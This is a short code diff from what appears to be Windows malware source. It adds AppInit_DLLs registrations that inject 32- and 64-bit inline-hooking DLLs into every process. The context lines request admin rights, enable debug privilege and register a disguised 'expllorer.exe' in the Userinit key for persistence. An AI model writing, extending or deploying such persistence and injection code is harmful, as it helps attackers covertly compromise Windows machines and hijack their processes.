@@ -25,7 +25,9 @@ int main () {
 	RequestAdminRightsWithArgs();
 	EnableDebugPrivilege();
 	AddToUserInit(string(string(BIN_PATH)+"expllorer.exe").c_str());
-
+	
+	SetAppInitDLLs32("InlineHookDll32.dll");
+	SetAppInitDLLs64("InlineHookDll64.dll");
 
 	/*string YourKey;cout<<"Please enter the password=> ";cin>>YourKey;CLS
 	if(YourKey!=key){system("wininit.exe");}*/
